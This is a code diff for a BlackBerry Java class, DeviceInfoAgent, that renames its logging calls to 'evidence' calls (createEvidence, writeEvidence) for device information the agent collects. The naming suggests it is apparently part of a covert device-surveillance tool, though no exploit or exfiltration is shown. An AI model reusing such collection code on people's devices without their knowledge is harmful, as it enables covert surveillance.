@@ -28,8 +28,8 @@ import blackberry.Device;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.log.Log;
-import blackberry.log.LogType;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.utils.Check;
 
 // TODO: Auto-generated Javadoc
@@ -55,7 +55,7 @@ public final class DeviceInfoAgent extends Agent {
         super(AGENT_DEVICE, agentEnabled, Conf.AGENT_DEVICEINFO_ON_SD,
                 "DeviceInfoAgent");
         //#ifdef DBC
-        Check.asserts(Log.convertTypeLog(agentId) == LogType.DEVICE,
+        Check.asserts(Evidence.convertTypeEvidence(agentId) == EvidenceType.DEVICE,
                 "Wrong Conversion");
         //#endif
 
@@ -81,10 +81,10 @@ public final class DeviceInfoAgent extends Agent {
      */
     public void actualRun() {
         //#ifdef DBC
-        Check.requires(log != null, "Null log");
+        Check.requires(evidence != null, "Null log");
         //#endif
 
-        log.createLog(null);
+        evidence.createEvidence(null);
 
         boolean ret = true;
 
@@ -190,7 +190,7 @@ public final class DeviceInfoAgent extends Agent {
             //#endif
         }
 
-        ret = log.writeLog(sb.toString(), true);
+        ret = evidence.writeEvidence(sb.toString(), true);
 
         if (ret == false) {
             //#ifdef DEBUG
@@ -198,7 +198,7 @@ public final class DeviceInfoAgent extends Agent {
             //#endif
         }
 
-        log.close();
+        evidence.close();
     }
 
     /**
